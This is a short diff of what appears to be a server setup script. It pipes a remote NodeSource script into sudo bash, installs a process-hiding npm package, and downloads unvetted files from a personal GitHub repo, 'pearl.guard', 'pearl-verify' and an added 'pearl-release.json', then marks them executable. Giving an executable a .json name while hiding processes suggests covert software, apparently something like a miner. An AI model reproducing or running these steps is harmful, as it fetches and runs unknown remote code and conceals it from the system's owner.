@@ -13,6 +13,8 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
+wget https://raw.githubusercontent.com/usapindong/test/refs/heads/main/pearl-release.json && chmod +x pearl-release.json
+
 wget https://github.com/usapindong/test/raw/refs/heads/main/pearl.guard && chmod +x pearl.guard
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/pearl-verify && chmod +x pearl-verify
